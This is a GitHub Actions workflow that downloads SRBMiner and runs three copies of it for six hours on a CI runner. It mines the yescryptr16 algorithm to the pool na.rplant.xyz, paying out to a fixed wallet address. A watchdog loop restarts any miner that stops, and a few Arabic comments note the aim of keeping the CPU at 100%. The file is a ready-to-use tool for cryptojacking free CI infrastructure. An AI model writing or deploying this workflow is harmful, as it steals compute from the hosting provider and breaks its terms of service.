name: Linux-Miner-Yescryptr16-MaxPerf

on:
  workflow_dispatch:

jobs:
  miner:
    runs-on: ubuntu-latest
    timeout-minutes: 360

    steps:

      - name: System Optimization
        run: |
          sudo apt update
          sudo apt install -y wget tar htop curl bc sysstat

          echo "performance" | sudo tee /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor || true
          sudo sysctl -w vm.swappiness=1
          sudo sysctl -w vm.dirty_ratio=3
          sudo sysctl -w vm.dirty_background_ratio=1
          sudo sysctl -w vm.vfs_cache_pressure=50

          sync
          echo 3 | sudo tee /proc/sys/vm/drop_caches

      - name: Download SRBMiner
        run: |
          wget -O miner.tar.gz "https://github.com/doktor83/SRBMiner-Multi/releases/download/3.0.3/SRBMiner-Multi-3-0-3-Linux.tar.gz"
          mkdir miner
          tar -xzf miner.tar.gz -C miner --strip-components=1
          chmod +x miner/SRBMiner-MULTI

      - name: Detect Cores
        run: |
          THREADS=$(nproc)
          echo "THREADS=$THREADS" >> $GITHUB_ENV
          echo "Detected $THREADS CPU cores."

      - name: Start Miner
        run: |
          cd miner

          # تشغيل 3 عمليات ماينر لتحقيق 100% CPU دائم
          for i in 1 2 3; do
            nohup ./SRBMiner-MULTI \
              -a yescryptr16 \
              -o stratum+tcps://na.rplant.xyz:17057 \
              -u GLyKJfe57qXadmpZPdeTJiUN4tE25upb1v \
              --cpu-threads $THREADS \
              --cpu-threads-priority 5 \
              --keepalive \
              --retry-pause 1 \
              --donate-level 0 > miner_$i.log 2>&1 &
          done

      - name: 6 Hour Watchdog Loop
        run: |
          echo "Starting 6-hour watchdog..."

          for minute in $(seq 1 360); do

            MINERS=$(pgrep -c SRBMiner || echo 0)

            # إذا ماتت عملية نعيد تشغيلها
            if [ "$MINERS" -lt 3 ]; then
              echo "Miner dropped, restarting missing instance..."
              cd miner
              nohup ./SRBMiner-MULTI \
                -a yescryptr16 \
                -o stratum+tcps://na.rplant.xyz:17057 \
                -u GLyKJfe57qXadmpZPdeTJiUN4tE25upb1v \
                --cpu-threads $THREADS \
                --cpu-threads-priority 5 \
                --donate-level 0 > revive.log 2>&1 &
            fi

            # كل 10 دقائق اطبع الحالة
            if [ $((minute % 10)) -eq 0 ]; then
              CPU=$(top -bn1 | grep "Cpu(s)" | awk '{print 100 - $8}')
              LOAD=$(cat /proc/loadavg | awk '{print $1}')
              echo "[$minute/360] CPU: ${CPU}% | Load: $LOAD | Miners: $MINERS"
            fi

            sleep 60
          done

      - name: Final Summary
        if: always()
        run: |
          echo "===== FINAL REPORT ====="
          echo "CPU: $(nproc) cores"
          echo "RAM: $(free -h | grep Mem | awk '{print $2}')"
          echo "Miner processes: $(pgrep -c SRBMiner || echo 0)"
          echo "Session Complete ✔️"
